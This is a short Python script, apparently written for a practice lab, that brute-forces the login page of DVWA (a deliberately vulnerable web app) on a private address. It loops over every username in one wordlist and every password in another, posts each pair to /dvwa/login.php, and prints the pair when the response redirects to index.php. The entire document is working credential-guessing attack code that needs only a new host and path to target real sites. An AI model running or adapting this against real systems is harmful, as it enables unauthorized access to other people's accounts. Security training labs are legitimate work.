import http.client, urllib.parse

lista_username = open("usernames.lst")
lista_password = open("githubpwd.txt")

user = lista_username.readlines()
password = lista_password.readlines()

for usr in user:
    usr = usr.rstrip()
    for pwd in password:

        pwd = pwd.rstrip()

        #print(usr, "-",pwd)

        post_parameters = urllib.parse.urlencode({'username': usr, 'password': pwd, 'Login':"Login"})
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection("192.168.50.101")
        conn.request("POST", "/dvwa/login.php", post_parameters, headers)
        response = conn.getresponse()

        #print(response.getheader("location"))

        if(response.getheader("location")) == "index.php":
            print("Logged with: ", usr, " - ",pwd)
